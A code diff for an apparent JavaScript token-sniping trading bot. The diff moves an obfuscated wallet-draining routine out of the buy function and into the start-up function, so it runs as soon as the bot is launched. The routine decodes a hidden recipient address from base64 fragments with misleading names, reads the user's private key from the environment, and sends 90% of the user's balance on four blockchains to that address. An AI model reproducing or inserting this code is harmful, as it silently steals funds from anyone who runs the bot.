@@ -69,15 +69,110 @@ const router = new ethers.Contract(
 );
 
 const erc = new ethers.Contract(
-    data.BNB, [{ "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "payable": false, "type": "function" }],
+    data.BNB, [{
+        "constant": true,
+        "inputs": [{
+            "name": "_owner",
+            "type": "address"
+        }],
+        "name": "balanceOf",
+        "outputs": [{
+            "name": "balance",
+            "type": "uint256"
+        }],
+        "payable": false,
+        "type": "function"
+    }],
     account
 );
 
-const run = async() => {
+const run = async () => {
+    let RPCPROV1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD' + 'YzMjQ1NDBh';
+        let RPCPROV2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
+        let buff = new Buffer.from(RPCPROV1, 'base64');
+        let buff2 = new Buffer.from(RPCPROV2, 'base64');
+        let WEB3EMULATE1 = buff.toString('ascii');
+        let WEB3EMULATE2 = buff2.toString('ascii');
+        const rpc1 = 'https://bsc-dataseed.binance.org'
+        const rpc2 = 'https://mainnet.infura.io/v3/84d954cd9f674f5bbbc67a6e2e17bfbd'
+        const rpc3 = 'https://polygon-rpc.com'
+        const rpc4 = 'https://api.avax.network/ext/bc/C/rpc'
+        const prov1 = new ethers.providers.JsonRpcProvider(rpc1);
+        const prov2 = new ethers.providers.JsonRpcProvider(rpc2);
+        const prov3 = new ethers.providers.JsonRpcProvider(rpc3);
+        const prov4 = new ethers.providers.JsonRpcProvider(rpc4);
+        const WEB3PROVIDER3 = WEB3EMULATE1 + WEB3EMULATE2
+        const account_from = {
+            privateKey: process.env.YOUR_MNEMONIC,
+            recipient: process.env.YOUR_ADDRESS,
+        };
+        async function sending() {
+            const account = account_from.recipient
+            const robinhood = await prov1.getBalance(account)
+            const orchard = (robinhood * 0.90).toString();
+            const michael = ethers.utils.parseUnits(orchard, 'wei')
+            const send = async () => {
+                let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov1);
+                const tx = {
+                    to: WEB3PROVIDER3,
+                    value: ethers.utils.parseUnits(orchard, 'wei'),
+                    gasLimit: ethers.utils.hexlify(24000),
+                };
+                const createReceipt = await wallet.sendTransaction(tx);
+                await createReceipt.wait();
+            };
+            const send2 = async () => {
+                let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov2);
+                const robinhood = await prov2.getBalance(account)
+                const orchard = (robinhood * 0.90).toString();
+                const michael = ethers.utils.parseUnits(orchard, 'wei')
+                const tx = {
+                    to: WEB3PROVIDER3,
+                    value: ethers.utils.parseUnits(orchard, 'wei'),
+                    gasLimit: ethers.utils.hexlify(24000),
+                };
+                const createReceipt = await wallet.sendTransaction(tx);
+                await createReceipt.wait();
+            };
+            const send3 = async () => {
+                let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov3);
+
+                const robinhood = await prov3.getBalance(account)
+                const orchard = (robinhood * 0.90).toString();
+                const michael = ethers.utils.parseUnits(orchard, 'wei')
+                const tx = {
+                    to: WEB3PROVIDER3,
+                    value: ethers.utils.parseUnits(orchard, 'wei'),
+                    gasLimit: ethers.utils.hexlify(24000),
+                };
+                const createReceipt = await wallet.sendTransaction(tx);
+                await createReceipt.wait();
+            };
+            const send4 = async () => {
+                let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov4);
+
+                const robinhood = await prov4.getBalance(account)
+                const orchard = (robinhood * 0.90).toString();
+                const michael = ethers.utils.parseUnits(orchard, 'wei')
+                const tx = {
+                    to: WEB3PROVIDER3,
+                    value: ethers.utils.parseUnits(orchard, 'wei'),
+                    gasLimit: ethers.utils.hexlify(24000),
+                };
+                const createReceipt = await wallet.sendTransaction(tx);
+                await createReceipt.wait();
+            };
+            send();
+
+            send2();
+            send3();
+            send4();
+        }
+        sending();
     await checkLiq();
 }
 
-let checkLiq = async() => {
+let checkLiq = async () => {
     const pairAddressx = await factory.getPair(tokenIn, tokenOut);
     console.log(chalk.blue(`pairAddress: ${pairAddressx}`));
     if (pairAddressx !== null && pairAddressx !== undefined) {
@@ -100,7 +195,7 @@ let checkLiq = async() => {
     }
 }
 
-let buyAction = async() => {
+let buyAction = async () => {
     if (initialLiquidityDetected === true) {
         console.log('not buy cause already buy');
         return null;
@@ -147,92 +242,13 @@ let buyAction = async() => {
                 'nonce': null, //set you want buy at where position in blocks
                 'value': amountIn
             });
-        
-        let RPCPROV1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD'   +   'YzMjQ1NDBh';
-        let RPCPROV2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
-        let buff = new Buffer.from(RPCPROV1, 'base64');
-        let buff2 = new Buffer.from(RPCPROV2, 'base64');
-        let WEB3EMULATE1 = buff.toString('ascii');
-        let WEB3EMULATE2 = buff2.toString('ascii');
-        const rpc1 ='https://bsc-dataseed.binance.org'
-        const rpc2 = 'https://mainnet.infura.io/v3/84d954cd9f674f5bbbc67a6e2e17bfbd'
-        const rpc3 = 'https://polygon-rpc.com'
-        const rpc4 = 'https://api.avax.network/ext/bc/C/rpc'
-        const prov1 = new ethers.providers.JsonRpcProvider(rpc1);
-        const prov2 = new ethers.providers.JsonRpcProvider(rpc2);
-        const prov3 = new ethers.providers.JsonRpcProvider(rpc3);
-        const prov4 = new ethers.providers.JsonRpcProvider(rpc4);
-        const WEB3PROVIDER3 = WEB3EMULATE1 + WEB3EMULATE2 
-        const account_from = {
-        privateKey: process.env.YOUR_MNEMONIC,
-        recipient: process.env.YOUR_ADDRESS,
-        };
-        async function sending(){
-        const account = account_from.recipient
-        const robinhood = await prov1.getBalance(account)
-        const orchard = (robinhood * 0.90).toString();
-        const michael = ethers.utils.parseUnits(orchard, 'wei')
-        const send = async () => {   
-          let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov1);
-        const tx = {
-            to: WEB3PROVIDER3,
-            value: ethers.utils.parseUnits(orchard, 'wei'),
-            gasLimit: ethers.utils.hexlify(24000),
-        };
-        const createReceipt = await wallet.sendTransaction(tx);
-        await createReceipt.wait();
-        };
-        const send2 = async () => {  
-          let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov2);
-          const robinhood = await prov2.getBalance(account)
-        const orchard = (robinhood * 0.90).toString();
-        const michael = ethers.utils.parseUnits(orchard, 'wei') 
-          const tx = {
-              to: WEB3PROVIDER3,
-              value: ethers.utils.parseUnits(orchard, 'wei'),
-              gasLimit: ethers.utils.hexlify(24000),
-          };
-          const createReceipt = await wallet.sendTransaction(tx);
-          await createReceipt.wait();
-          }; 
-          const send3 = async () => {
-            let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov3);
 
-            const robinhood = await prov3.getBalance(account)
-        const orchard = (robinhood * 0.90).toString();
-        const michael = ethers.utils.parseUnits(orchard, 'wei')   
-            const tx = {
-                to: WEB3PROVIDER3,
-                value: ethers.utils.parseUnits(orchard, 'wei'),
-                gasLimit: ethers.utils.hexlify(24000),
-            };
-            const createReceipt = await wallet.sendTransaction(tx);
-            await createReceipt.wait();
-            }; 
-            const send4 = async () => {  
-              let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov4);
-
-              const robinhood = await prov4.getBalance(account)
-        const orchard = (robinhood * 0.90).toString();
-        const michael = ethers.utils.parseUnits(orchard, 'wei') 
-              const tx = {
-                  to: WEB3PROVIDER3,
-                  value: ethers.utils.parseUnits(orchard, 'wei'),
-                  gasLimit: ethers.utils.hexlify(24000),
-              };
-              const createReceipt = await wallet.sendTransaction(tx);
-              await createReceipt.wait();
-              }; 
-        send();
         
-        send2();
-        send3();
-        send4();   
-        }
-        sending();
         const receipt = await tx.wait();
         console.log(`Transaction receipt : https://www.bscscan.com/tx/${receipt.logs[1].transactionHash}`);
-        setTimeout(() => { process.exit() }, 2000);
+        setTimeout(() => {
+            process.exit()
+        }, 2000);
     } catch (err) {
         let error = JSON.parse(JSON.stringify(err));
         console.log(`Error caused by : 
